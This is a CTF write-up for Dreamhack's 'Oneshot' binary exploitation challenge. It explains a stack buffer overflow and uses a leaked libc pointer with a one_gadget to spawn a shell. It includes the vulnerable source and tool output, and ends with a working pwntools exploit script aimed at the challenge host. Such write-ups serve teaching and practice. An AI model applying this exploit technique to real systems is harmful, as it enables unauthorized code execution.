# Write-up of the challenge "Oneshot"

This challenge is part of the "Binary exploitation" category and is in **Level 1**.

# Goal of the challenge

The objective of this challenge is to overwrite the return address to make it point to a **one_gadget**.

## Program structure

```c
// gcc -o oneshot1 oneshot1.c -fno-stack-protector -fPIC -pie

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    char msg[16];
    size_t check = 0;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("MSG: ");
    read(0, msg, 46);

    if(check > 0) {
        exit(0);
    }

    printf("MSG: %s\n", msg);
    memset(msg, 0, sizeof(msg));
    return 0;
}

```

## Security breach

The vulnerability here is buffer overflow **read(0, msg, 46);**, because the msg is 16 bytes and we are reading 46 bytes.

## Solution

So I started off by checking if there are any one_gadgets in the provided libc?

```

┌──(abdullah㉿Abdullah)-[/mnt/d/chals/Dreamhack/pwn/oneshot]
└─$ one_gadget ./libc.so.6
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

┌──(abdullah㉿Abdullah)-[/mnt/d/chals/Dreamhack/pwn/oneshot]
└─$
```

So the goal here is clear just overwrite the **RIP** to make it point to that **one_gadget**.

But there is a problem since the oneshot has **PIE**, however at the run time it leaks the stdout as we can see in this block **printf("stdout: %p\n", stdout);**. Here's how I found out we are dealing with **PIE**:

```
checksec --file=./oneshot
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   79 Symbols        No    0               3               ./oneshot

```

So now our idea is to use that leak to subtract with the libc's _IO_2_1_stdout_ to find the base then we can reference that one_gadget correctly using a basic formula:

```
shell = base + one_gadget
```

However there is another problem because in the source code it is checking if the **check variable** is zero then it will exit so we have to **buffer overflow** carefully and place 0 zero at the correct place and then overwrite the **RIP**!

```c
if(check > 0) {
   exit(0);
}
```

So I used **dogbolt** on the binary and I got this in return:

```c
int main(unsigned int a0, unsigned long long a1)
{
     unsigned long long v0;  // [bp-0x38]
     unsigned int v1;  // [bp-0x2c]
     char v2;  // [bp-0x28]
     void* v3;  // [bp-0x10]

     v1 = a0;
     v0 = a1;
     v3 = 0;
     initialize();
     printf("stdout: %p\n", *((long long *)&stdout));
     printf("MSG: ");
     read(0, &v2, 46);
     printf("MSG: %s\n", &v2);
     memset(&v2, 0, 16);
     return 0;d
}
```
 
So the offset from the buffer to the check is **0x28 - 0x10 = 24**, then we add an extra 8 of **zeros** to make the **check variable** value zero.

After that we need to overwrite the RIP we know that the **RIP for the buffer is at bp-0x28**. So we sent **24 A's** as padding to reach the check value and we added **8 0's** to overwrite it's the check variable value. So the amount left to reach the **RIP** is **0x28 - 32**, which is **8** that's why we add also **8 of padding** after to overwrite the **RIP**.

solve.py

```python
from pwn import *

# p = process('./oneshot')
p = remote('host3.dreamhack.games',9441)

libc = ELF('libc.so.6')

one_gadget = 0x45216

p.recvuntil(b'stdout:')

std_out_leak = p.recvline()

std_out = int(std_out_leak.strip().decode(), 16)

base = std_out - libc.symbols["_IO_2_1_stdout_"]

shell = base + one_gadget

payload = b'A'*24
payload += b'\x00'*8
payload += b'B'*8
payload += p64(shell)

p.sendline(payload)


p.interactive()
```
